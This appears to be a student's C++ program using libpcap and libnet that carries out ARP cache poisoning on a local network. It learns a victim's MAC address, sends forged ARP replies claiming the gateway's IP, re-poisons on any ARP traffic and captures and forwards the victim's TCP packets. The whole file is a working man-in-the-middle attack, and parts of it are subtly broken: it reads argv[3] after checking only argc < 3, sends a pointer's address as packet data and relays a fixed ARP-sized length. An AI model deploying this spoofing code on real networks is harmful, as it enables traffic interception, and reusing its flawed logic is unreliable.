#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <libnet.h>

//MAC주소 길이
#define MAC_ALEN 6
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

//my IP/MAC address
int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
    struct ifreq ifr;
    int sockfd, ret;

    printf("Get interface(%s) MAC address\n", ifname);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    memcpy((void*)mac_addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    char ipstr[40];
    //memcpy((void*)ip_addr, ifr.ifr_addr.sa_data, Ip::SIZE);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
    printf("%s", ipstr);
    *ip_addr = Ip(ipstr);
    close(sockfd);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
		usage();
		return -1;
	}

	char* dev = argv[1];
    Ip s_ip(argv[2]);
    Ip t_ip(argv[3]);

    EthArpPacket packet;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    char errbuf_2[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);

    Mac MAC_ADD;
    Mac MAC_GATEWAY;
    Ip IP_ADD;

    //MAC_ADD , IP_ADD is my mac & ip + gateway MAC_ADD..?
    GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);

    //To get vicitm MAC address - arp request to victim
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(MAC_ADD);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD
    packet.arp_.sip_ = htonl(IP_ADD); //my ip - any ip in here can get reply packet
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(s_ip);  //victim ip

    //ARP request packet to victim
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    //waiting for ARP reply packet from victim... to get vicitm MAC
    while (true) {
            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);

            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP){
                continue;
            }
            EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                printf("Victim Mac Address Captured success\n");
                MAC_GATEWAY = packet.arp_.tmac_;
                packet.arp_.tmac_ = arp_packet->arp_.smac();
                packet.eth_.dmac_ = arp_packet->arp_.smac();
                break;
            }
    }


    //attack
    printf("start arp attack");
    //destination mac is defined (victim mac)
    packet.eth_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
    packet.arp_.sip_ = htonl(t_ip); //gateway ip
    //victim mac is defined
    packet.arp_.tip_ = htonl(s_ip);  //victim ip

    //attack packet
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    //relay to gateway
    //if not ARP packet, than relay to gateway all
    //waiting for ARP reply packet from victim... to get vicitm MAC
    while (true) {
            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }

            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);
            libnet_ipv4_hdr *ip_hdr_v4 = (libnet_ipv4_hdr*)(out_packet + sizeof(libnet_ethernet_hdr));

            //if get ARP packet from ???? than we attack again
            if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
                //attack packet
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&out_packet), sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                continue;
            }

            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
                       //printf("PASS! type : %d\n", ntohs(eth_hdr->ether_type));
                       continue;
                   }
                   if(ip_hdr_v4->ip_p != IPPROTO_TCP){
                       //printf("PASS! protocol : %d\n", ip_hdr_v4->ip_p);
                       continue;
                   }
                   printf("%u bytes captured\n", header->caplen);

           //ethernet hdr source_mac
           printf("\nsour MAC : ");
           for (int i = 0; i<ETHER_ADDR_LEN; i++){
               if (i == ETHER_ADDR_LEN-1){
                   printf("0x%02x", eth_hdr->ether_shost[i]);
               }
               else{
                   printf("0x%02x:", eth_hdr->ether_shost[i]);
               }
           }

           //make relay packetS
           packet.arp_.tmac_ = Mac(MAC_GATEWAY);
           packet.eth_.dmac_ = Mac(MAC_GATEWAY);

           //relay to gateway
           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&out_packet), sizeof(EthArpPacket));
           printf("%u bytes relayed to gateway\n", header->caplen);

           if (res != 0) {
               fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
           }
    }

	pcap_close(handle);
}
